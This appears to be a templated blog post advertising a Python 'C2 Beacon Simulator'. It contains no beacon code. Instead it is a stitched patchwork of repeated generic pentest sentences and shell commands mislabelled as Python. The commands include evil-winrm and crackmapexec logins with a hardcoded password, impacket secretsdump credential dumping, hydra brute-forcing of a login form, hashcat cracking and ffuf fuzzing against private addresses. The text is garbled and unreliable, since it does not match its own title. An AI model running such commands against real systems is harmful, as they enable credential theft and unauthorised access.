---
TitleSEO: "C2 Beacon Simulator in Python | ZureFX"
TitlePost: "C2 Beacon Simulator — Python"
Author: "ZureFX"
Description: "A Python script for c2 beacon simulator. Built for security research and automation."
Keywords: "rust, bash, fuzzer, tool, scanner, script, python"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-291.html"
URL_IMAGES: ""
Date: "2024-11-30"
Tags: "Rust, Bash, Fuzzer, Tool, Scanner, Script, Python"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-291"
Permalink: "/scripting/script-c2-beacon-simulator-291.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `nikto`
- `psexec`
- `sqlmap`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```python
evil-winrm -i 10.28.194.175 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

```python
crackmapexec smb 10.51.82.86 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.33.13.217/FUZZ
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.88.53 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.223.236
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 13.95s
```
